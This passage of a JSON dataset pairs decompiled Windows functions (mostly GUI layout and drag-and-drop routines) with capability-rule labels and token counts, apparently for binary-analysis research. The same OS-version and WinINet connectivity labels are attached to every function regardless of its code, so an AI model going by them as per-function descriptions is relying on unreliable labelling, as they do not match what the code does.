            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00466c84(void)\n\n{\n    int32_t *in_EAX;\n    \n    if (in_EAX[0x6d] == 0) {\n        if (in_EAX[0xc] != 0) {\n            fcn.00466c84();\n        }\n        (**(*in_EAX + 0x98))();\n    }\n    return;\n}\n",
        "token_count": 84
    },
    "00466fb4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00466fb4(void)\n\n{\n    uint32_t in_EAX;\n    \n    return in_EAX & 0xffffff00 | *(in_EAX + 0x1b4) != 0;\n}\n",
        "token_count": 51
    },
    "004670d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004670d8(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    char in_CL;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_5h;\n    \n    var_ch = 0;\n    puStack40 = 0x4670fa;\n    iVar2 = fcn.00404610();\n    uStack44 = 0x4671ce;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.0040483c();\n    if (0 < *(iVar2 + 8)) {\n        var_10h = fcn.0041966c();\n        iVar4 = var_10h;\n        if (var_10h == -1) {\n            if (in_CL == '\\0') {\n                var_10h = 0;\n                iVar4 = var_10h;\n            }\n            else {\n                var_10h = *(iVar2 + 8) + -1;\n                iVar4 = var_10h;\n            }\n        }\n        do {\n            if (in_CL == '\\0') {\n                if (iVar4 == 0) {\n                    iVar4 = *(iVar2 + 8);\n                }\n                iVar4 = iVar4 + -1;\n            }\n            else {\n                iVar4 = iVar4 + 1;\n                if (iVar4 == *(iVar2 + 8)) {\n                    iVar4 = 0;\n                }\n            }\n            iVar3 = fcn.00419610();\n            cVar1 = fcn.0040483c();\n            if (((cVar1 != '\\0') && ((arg_ch == '\\0' || (*(iVar3 + 0x1d8) != '\\0')))) &&\n               ((arg_8h == '\\0' || (*(iVar3 + 0x30) == in_EAX)))) {\n                var_ch = iVar3;\n            }\n        } while ((var_ch == 0) && (iVar4 != var_10h));\n    }\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x4671d5;\n    uStack44 = 0x4671cd;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 565
    },
    "004672a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004672a0(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t *in_ECX;\n    int32_t *in_EDX;\n    \n    iVar1 = in_EAX[0x1d];\n    if (*(iVar1 + 0x14) == 0) {\n        *in_EDX = 0;\n    }\n    else {\n        *in_EDX = *(in_EAX[0x1d] + 0x14);\n    }\n    if (*(iVar1 + 0x10) == 0) {\n        *in_ECX = 0;\n    }\n    else {\n        *in_ECX = *(in_EAX[0x1d] + 0x10);\n    }\n    if (*(iVar1 + 0xc) == 0) {\n        *arg_ch = 0;\n    }\n    else {\n        *arg_ch = *(in_EAX[0x1d] + 0xc);\n    }\n    if (*(iVar1 + 8) == 0) {\n        *arg_8h = 0;\n    }\n    else {\n        *arg_8h = *(in_EAX[0x1d] + 8);\n    }\n    if ((*(in_EAX + 0x52) & 0x10) != 0) {\n        iVar1 = *(in_EAX[0x1e] + 8) + *(in_EAX[0x1e] + 0x10);\n        if (0 < *in_EDX) {\n            *in_EDX = *in_EDX + iVar1;\n        }\n        if (iVar1 <= *arg_ch) {\n            *arg_ch = *arg_ch - iVar1;\n        }\n        iVar1 = *(in_EAX[0x1e] + 0xc) + *(in_EAX[0x1e] + 0x14);\n        if (0 < *in_ECX) {\n            *in_ECX = *in_ECX + iVar1;\n        }\n        if (iVar1 <= *arg_8h) {\n            *arg_8h = *arg_8h - iVar1;\n        }\n    }\n    (**(*in_EAX + 0x38))(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 517
    },
    "00467364": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00467364(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *in_EDX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    int32_t lprc;\n    int32_t var_5ah;\n    int32_t var_56h;\n    int32_t var_52h;\n    char var_4eh;\n    char var_4dh;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    var_4h = in_EDX;\n    cVar1 = fcn.00466fb4();\n    if ((cVar1 != '\\0') && (iVar3 = fcn.00462d98(),  iVar3 != 0)) {\n        (**(*in_EAX + 0x44))();\n        (**(*in_EAX + 0x90))();\n        iVar3 = sub.user32.dll_IsRectEmpty();\n        if (iVar3 == 0) {\n            var_ch = (**(*in_EAX[0x1e] + 0x10))();\n            var_ch = var_ch - (var_56h - lprc);\n            var_10h = (**(*in_EAX[0x1e] + 0x10))();\n            var_10h = var_10h - (var_52h - var_5ah);\n            var_14h = (**(*in_EAX[0x1e] + 0x10))();\n            var_14h = var_14h - (var_56h - lprc);\n            var_18h = (**(*in_EAX[0x1e] + 0x10))();\n            var_18h = var_18h - (var_52h - var_5ah);\n            if (0 < *var_4h) {\n                *var_4h = *var_4h - var_ch;\n            }\n            if (0 < *var_8h) {\n                *var_8h = *var_8h - var_10h;\n            }\n            if (0 < *arg_ch) {\n                *arg_ch = *arg_ch - var_14h;\n            }\n            if (0 < *arg_8h) {\n                *arg_8h = *arg_8h - var_18h;\n            }\n            arg_8h_00 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff80;\n            var_20h = 0;\n            var_30h = 0;\n            var_24h = 0;\n            var_34h = 0;\n            var_28h = 0;\n            var_38h = 0;\n            var_2ch = 0;\n            var_3ch = 0;\n            iVar3 = fcn.00462d98();\n            if (-1 < iVar3 + -1) {\n                var_1ch = 0;\n                do {\n                    iVar4 = fcn.00462d5c();\n                    if ((*(iVar4 + 0x57) != '\\0') || (((*(iVar4 + 0x1c) & 0x10) != 0 && ((*(iVar4 + 0x51) & 4) == 0))))\n                    {\n                        arg_8h_00 = &var_4ch;\n                        fcn.004672a0(arg_8h_00, &var_44h);\n                        cVar1 = *(iVar4 + 0x5b);\n                        if (cVar1 == '\\0') {\n                            if (*0x4677e8 == (*(iVar4 + 0x61) & *0x4677e8)) {\n                                var_4dh = '\\x01';\n                                if (0 < var_40h) {\n                                    iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                                    var_40h = ((var_56h - lprc) - iVar5) - var_40h;\n                                }\n                                if (0 < var_44h) {\n                                    iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                                    var_44h = ((var_56h - lprc) + var_44h) - iVar5;\n                                }\n                            }\n                            else {\n                                var_4dh = '\\0';\n                            }\n                        }\n                        else if (cVar1 - 1U < 2) {\n                            var_4dh = '\\x01';\n                        }\n                        else if (cVar1 == '\\x05') {\n                            var_4dh = '\\x02';\n                        }\n                        else {\n                            var_4dh = '\\x03';\n                        }\n                        if (*(iVar4 + 0x5b) == '\\0') {\n                            if (*0x4677ec == (*(iVar4 + 0x61) & *0x4677ec)) {\n                                var_4eh = '\\x01';\n                                if (0 < var_48h) {\n                                    iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                                    var_48h = ((var_52h - var_5ah) - iVar5) - var_48h;\n                                }\n                                if (0 < var_4ch) {\n                                    iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                                    var_4ch = ((var_52h - var_5ah) + var_4ch) - iVar5;\n                                }\n                            }\n                            else {\n                                var_4eh = '\\0';\n                            }\n                        }\n                        else {\n                            uVar2 = *(iVar4 + 0x5b) - 3;\n                            if (uVar2 < 2) {\n                                var_4eh = '\\x01';\n                            }\n                            else if (uVar2 == 2) {\n                                var_4eh = '\\x02';\n                            }\n                            else {\n                                var_4eh = '\\x03';\n                            }\n                        }\n                        if (var_4dh - 1U < 2) {\n                            if (((0 < var_40h) && (*var_4h < var_40h)) && (*var_4h = var_40h,  var_20h < *var_4h)) {\n                                var_20h = *var_4h;\n                            }\n                            if (((0 < var_44h) && (var_44h < *arg_ch)) && (*arg_ch = var_44h,  var_24h < *arg_ch)) {\n                                var_24h = *arg_ch;\n                            }\n                        }\n                        else if (var_4dh == '\\x03') {\n                            iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                            var_30h = var_30h + iVar5;\n                            iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                            var_34h = var_34h + iVar5;\n                        }\n                        if (var_4eh - 1U < 2) {\n                            if (((0 < var_48h) && (*var_8h < var_48h)) && (*var_8h = var_48h,  var_28h < *var_8h)) {\n                                var_28h = *var_8h;\n                            }\n                            if (((0 < var_4ch) && (var_4ch < *arg_8h)) && (*arg_8h = var_4ch,  var_2ch < *arg_8h)) {\n                                var_2ch = *arg_8h;\n                            }\n                        }\n                        else if (var_4eh - 1U == 2) {\n                            iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                            var_38h = var_38h + iVar5;\n                            iVar4 = (**(**(iVar4 + 0x78) + 0x10))();\n                            var_3ch = var_3ch + iVar4;\n                        }\n                    }\n                    var_1ch = var_1ch + 1;\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n            }\n            if ((0 < var_20h) && (*var_4h < var_20h + var_30h)) {\n                *var_4h = var_20h + var_30h;\n            }\n            if ((0 < var_24h) && ((*arg_ch == 0 || (*arg_ch < var_24h + var_34h)))) {\n                *arg_ch = var_24h + var_34h;\n            }\n            if ((0 < var_28h) && (*var_8h < var_28h + var_38h)) {\n                *var_8h = var_28h + var_38h;\n            }\n            if ((0 < var_2ch) && ((*arg_8h == 0 || (*arg_8h < var_2ch + var_3ch)))) {\n                *arg_8h = var_2ch + var_3ch;\n            }\n            *in_FS_OFFSET = arg_8h_00;\n            if (0 < *var_4h) {\n                *var_4h = *var_4h + var_ch;\n            }\n            if (0 < *var_8h) {\n                *var_8h = *var_8h + var_10h;\n            }\n            if (0 < *arg_ch) {\n                *arg_ch = *arg_ch + var_14h;\n            }\n            if (0 < *arg_8h) {\n                *arg_8h = *arg_8h + var_18h;\n            }\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 2347
    },
    "004678a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004678a4(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_34h;\n    uint var_30h;\n    uint var_24h;\n    uint var_20h;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack72 = 0x4678c2;\n    cVar1 = fcn.00466fb4();\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x5b) != '\\x05')) {\n        if ((*(in_EAX + 7) & 0x10) != 0) {\n            puStack72 = 0x4678e8;\n            iVar2 = fcn.00462d98();\n            if (iVar2 < 1) {\n                return 1;\n            }\n        }\n        puStack72 = 0x4678fe;\n        (**(*in_EAX + 0xc0))();\n        puStack72 = 0x467909;\n        (**(*in_EAX + 0x44))();\n        puStack72 = 0x467917;\n        (**(*in_EAX + 0x90))();\n        puStack72 = 0x46791f;\n        fcn.004628b4();\n        uStack76 = 0x4679d2;\n        uStack80 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffb0;\n        puStack72 = &stack0xfffffffc;\n        iVar2 = fcn.00462d98();\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar3 = fcn.00462d5c();\n                if ((*(piVar3 + 0x57) != '\\0') || (((*(piVar3 + 7) & 0x10) != 0 && ((*(piVar3 + 0x51) & 4) == 0)))) {\n                    (**(*piVar3 + 0x88))(piVar3[0x13], piVar3[0x12]);\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        *in_FS_OFFSET = uStack80;\n        puStack72 = 0x4679d9;\n        *(in_EAX + 0x15) = *(in_EAX + 0x15) & 0xffef;\n        uStack76 = 0x4679d1;\n        uVar4 = fcn.004628bc();\n        return uVar4;\n    }\n    return 1;\n}\n",
        "token_count": 631
    },
    "00467f9c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00467f9c(uint param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar1 = *(in_EAX + 0x30);\n    while ((iVar2 = iVar1,  *(in_EAX + 0x94) == 0 && (iVar2 != 0))) {\n        in_EAX = iVar2;\n        iVar1 = *(iVar2 + 0x30);\n    }\n    if (in_EAX != 0) {\n        fcn.0045eae0(param_2 & 0x7f);\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "00468110": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00468110(void)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x468124;\n    cVar2 = fcn.00466fb4();\n    if ((cVar2 == '\\0') || ((*(in_EAX + 0x55) & 0x20) != 0)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    if (bVar1) {\n        puStack20 = 0x46814a;\n        fcn.00468048();\n    }\n    uStack24 = 0x468180;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    fcn.0045ee18();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x468187;\n    if (bVar1) {\n        uStack24 = 0x46817f;\n        fcn.00468048();\n    }\n    return;\n}\n",
        "token_count": 282
    },
    "004683e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004683e0(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x46846b;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    fcn.00467f84();\n    if (*(in_EAX + 600) == '\\0') {\n        fcn.0045ef44();\n        fcn.004289bc();\n        fcn.0045e63c();\n        fcn.0045ef44();\n        fcn.004289d8();\n        fcn.0045e670();\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x468472;\n    uStack24 = 0x46846a;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 232
    },
    "0046880c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046880c(uint param_1, int16_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((param_2 != *(in_EAX + 0x68)) && (*(in_EAX + 0x68) = param_2,  *(in_EAX + 0x6a) != '\\0')) {\n        fcn.00479e80();\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "00468830": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00468830(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint var_4h;\n    \n    uVar2 = 0;\n    cVar1 = fcn.0046ca94();\n    if (cVar1 != '\\0') {\n        if (*(in_EAX + 0x6a) == '\\0') {\n            fcn.004687c4(*(in_EAX + 0x74));\n        }\n        uVar2 = fcn.004688a4(arg_8h);\n        if (uVar2 != '\\0') {\n            *(in_EAX + 0x7c) = *(**0x4a514c + 0x44);\n            fcn.00479e80();\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 190
    },
    "00468908": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00468908(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    cVar1 = fcn.0046ca94();\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x6c) != 0)) {\n        sub.comctl32.dll_ImageList_DragLeave(*(in_EAX + 0x6c));\n        *(in_EAX + 0x6c) = 0;\n    }\n    return;\n}\n",
        "token_count": 110
    },
    "004689a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.004689a0(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    bool bVar3;\n    \n    cVar1 = fcn.0046ca94();\n    if ((cVar1 == '\\0') || (*(in_EAX + 0x6a) == '\\0')) {\n        bVar3 = false;\n    }\n    else {\n        fcn.00468908();\n        iVar2 = sub.comctl32.dll_ImageList_EndDrag();\n        bVar3 = iVar2 != 0;\n        *(in_EAX + 0x6a) = 0;\n        fcn.0046880c();\n        fcn.00479e80();\n    }\n    return bVar3;\n}\n",
        "token_count": 168
    },
    "004689f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.004689f0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00461be4();\n    uVar1 = fcn.00428554();\n    *(in_EAX + 0x250) = uVar1;\n    fcn.0045d7f0();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 201
    },
    "00468b68": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00468b68(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x14) == 0) || (*(*(in_EAX + 0x14) + 0x10) == '\\0')) &&\n       ((in_EAX != *(*(in_EAX + 0x1c) + 100) || (*(in_EAX + 0x10) == '\\0')))) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 113
    },
    "00468cb0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00468cb0(uint param_1, char param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint uStack32;\n    uint uStack28;\n    \n    iVar1 = in_EAX;\n    while (iVar3 = iVar1,  iVar3 != *(*(in_EAX + 0x1c) + 100)) {\n        iVar1 = *(iVar3 + 0x14);\n        if ((param_2 == *(iVar1 + 0x10)) && (*(iVar3 + 0x18) != 0)) {\n            uVar2 = fcn.00469108();\n            return uVar2;\n        }\n    }\n    (**(**(*(in_EAX + 0x1c) + 0x14) + 0x44))();\n    (**(**(*(in_EAX + 0x1c) + 0x14) + 0x90))();\n    if (param_2 == '\\x01') {\n        return uStack28;\n    }\n    if (param_2 == '\\x02') {\n        return uStack32;\n    }\n    return 0;\n}\n",
        "token_count": 267
    },
    "00468d34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00468d34(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iStack32;\n    int32_t iStack28;\n    int32_t iStack24;\n    int32_t iStack20;\n    \n    if ((in_EAX == *(*(in_EAX + 0x1c) + 100)) ||\n       (((iVar2 = in_EAX,  *(*(in_EAX + 0x1c) + 100) == *(in_EAX + 0x14) && (*(in_EAX + 4) != 0)) &&\n        (iVar1 = fcn.00468bc4(),  iVar1 == 1)))) {\n        (**(**(*(in_EAX + 0x1c) + 0x14) + 0x44))();\n        (**(**(*(in_EAX + 0x1c) + 0x14) + 0x90))();\n        if (param_2 == '\\x01') {\n            iVar2 = iStack20 - iStack28;\n        }\n        else {\n            iVar2 = iStack24 - iStack32;\n        }\n    }\n    else {\n        for (; iVar2 != *(*(in_EAX + 0x1c) + 100); iVar2 = *(iVar2 + 0x14)) {\n            if (param_2 == *(*(iVar2 + 0x14) + 0x10)) {\n                iVar2 = fcn.00469108();\n                iVar1 = fcn.00468c20();\n                return iVar2 - iVar1;\n            }\n        }\n        if (param_2 == *(*(*(in_EAX + 0x1c) + 100) + 0x10)) {\n            iVar2 = *(*(in_EAX + 0x1c) + 0x68);\n        }\n        else {\n            iVar2 = fcn.00469108();\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 449
    },
    "00468dec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00468dec(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.00468bc4();\n    if ((iVar1 != 0) && (*(in_EAX + 0x10) != '\\0')) {\n        iVar2 = fcn.0046920c();\n        if (*(in_EAX + 0x10) == '\\x01') {\n            iVar1 = fcn.00468d34();\n        }\n        else if (*(in_EAX + 0x10) == '\\x02') {\n            iVar1 = fcn.00468d34();\n        }\n        else {\n            iVar1 = 0;\n        }\n        iVar3 = fcn.00468bc4();\n        iVar1 = iVar1 / iVar3;\n        while (iVar2 != 0) {\n            if (*(iVar2 + 0xc) == 0) {\n                fcn.00469130();\n            }\n            else {\n                fcn.00468c20();\n                fcn.00469130();\n            }\n            fcn.00468f8c();\n            iVar1 = fcn.004691e4();\n            iVar2 = iVar1;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 287
    },
    "00468e94": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00468e94(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.0040546c();\n    if (*(in_EAX + 4) != 0) {\n        if (*(*(in_EAX + 4) + 8) == 0) {\n            fcn.0040dab4();\n            fcn.00404eb4();\n        }\n        fcn.004054c0();\n    }\n    return;\n}\n",
        "token_count": 101
    },
    "00468ed8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Removing unreachable block (ram,0x00468f0d)\n\nuint fcn.00468ed8(void)\n\n{\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    fcn.0040483c();\n    return 0;\n}\n",
        "token_count": 80
    },
    "00468f8c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00468f8c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint *arg_8h;\n    uint var_14h;\n    int32_t var_4h;\n    \n    iVar2 = *(in_EAX + 4);\n    if (iVar2 == 0) {\n        return;\n    }\n    if (*(iVar2 + 0x57) == '\\0') {\n        return;\n    }\n    if (*(*(in_EAX + 0x1c) + 0x6c) != 0) {\n        return;\n    }\n    *(iVar2 + 0x90) = *(*(in_EAX + 0x14) + 0x10);\n    var_4h = in_EAX;\n    fcn.00468d34();\n    iVar2 = fcn.00468d34();\n    cVar1 = fcn.00468f5c(&stack0xfffffffc);\n    if ((cVar1 != '\\0') && (*(*(var_4h + 0x14) + 0x10) != '\\x01')) {\n        iVar2 = iVar2 - *(*(var_4h + 0x1c) + 0xc);\n    }\n    iVar3 = fcn.004691e4();\n    if ((iVar3 == 0) &&\n       (((*(var_4h + 0x14) == *(*(var_4h + 0x1c) + 100) ||\n         (*(*(var_4h + 0x14) + 0x10) != *(*(*(var_4h + 0x1c) + 100) + 0x10))) ||\n        (iVar3 = fcn.00469108(),  *(*(var_4h + 0x1c) + 0x68) <= iVar3)))) {\n        if (*(*(var_4h + 0x14) + 0x10) == *(*(*(var_4h + 0x1c) + 100) + 0x10)) goto code_r0x004690b5;\n        iVar3 = fcn.00469108();\n        iVar4 = fcn.00469108();\n        if (iVar4 <= iVar3) goto code_r0x004690b5;\n    }\n    if (*(*(var_4h + 0x14) + 0x10) == '\\x01') {\n        iVar2 = iVar2 - *(*(var_4h + 0x1c) + 0xc);\n    }\ncode_r0x004690b5:\n    arg_8h = &var_14h;\n    uVar5 = fcn.00468cb0();\n    fcn.00468cb0(uVar5);\n    fcn.004181e8(arg_8h, iVar2);\n    (****(var_4h + 0x1c))();\n    fcn.0045e884();\n    return;\n}\n",
        "token_count": 674
    },
    "00469404": {
        "rules": [
